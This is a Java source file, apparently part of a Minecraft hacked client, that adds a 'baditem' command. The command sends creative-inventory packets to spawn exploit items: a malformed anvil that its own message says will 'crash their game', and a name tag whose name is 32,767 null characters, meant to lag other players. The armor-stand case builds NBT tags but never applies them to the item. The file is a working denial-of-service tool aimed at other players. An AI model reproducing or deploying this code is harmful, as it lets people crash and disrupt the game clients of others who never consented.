package io.github.alerithe.client.features.commands.impl;

import io.github.alerithe.client.features.commands.Command;
import io.github.alerithe.client.features.commands.ErrorMessages;
import io.github.alerithe.client.utilities.Wrapper;
import net.minecraft.init.Blocks;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;

public class CommandBadItem extends Command {
    private final String tagName;

    public CommandBadItem() {
        super("baditem", new String[0], "<anvil/tag/stand>");

        StringBuilder builder = new StringBuilder();
        for (int i = 0; i < 32767; i++) {
            builder.append('\0');
        }

        tagName = builder.toString();
    }

    @Override
    public void execute(String[] args) {
        if (!Wrapper.getPlayer().capabilities.isCreativeMode) {
            Wrapper.printMessage(ErrorMessages.format("You must be in Creative Mode to use this command."));
            return;
        }

        if (args.length < 1) {
            Wrapper.printMessage(ErrorMessages.NOT_ENOUGH_ARGS);
            return;
        }

        int slot = Wrapper.getPlayer().inventory.currentItem + 36; // Set the item to spawn in their selected slot

        switch (args[0].toLowerCase()) {
            case "anvil": {
                ItemStack stack = new ItemStack(Blocks.anvil, 64, 3);
                Wrapper.sendPacket(new C10PacketCreativeInventoryAction(slot, stack));
                Wrapper.printMessage("Make other players place this Anvil to crash their game.");
                break;
            }
            case "tag": {
                ItemStack stack = new ItemStack(Items.name_tag, 64);
                stack.setStackDisplayName(tagName);
                Wrapper.sendPacket(new C10PacketCreativeInventoryAction(slot, stack));
                Wrapper.printMessage("Apply this tag to an entity to lag other players.");
                break;
            }
            case "stand": {
                ItemStack stack = new ItemStack(Items.armor_stand, 64);
                stack.setStackDisplayName("#HopeClient");
                NBTTagCompound tags = new NBTTagCompound();
                tags.setInteger("Invisible", 1);
                tags.setByte("NoGravity", (byte) 1);
                tags.setDouble("x", 42);
                tags.setDouble("y", 69);
                tags.setDouble("z", 42);
                Wrapper.sendPacket(new C10PacketCreativeInventoryAction(slot, stack));
                Wrapper.printMessage("Apply this tag to an entity to lag other players.");
                break;
            }
            default:
                Wrapper.printMessage(ErrorMessages.INVALID_ARG);
                break;
        }
    }
}
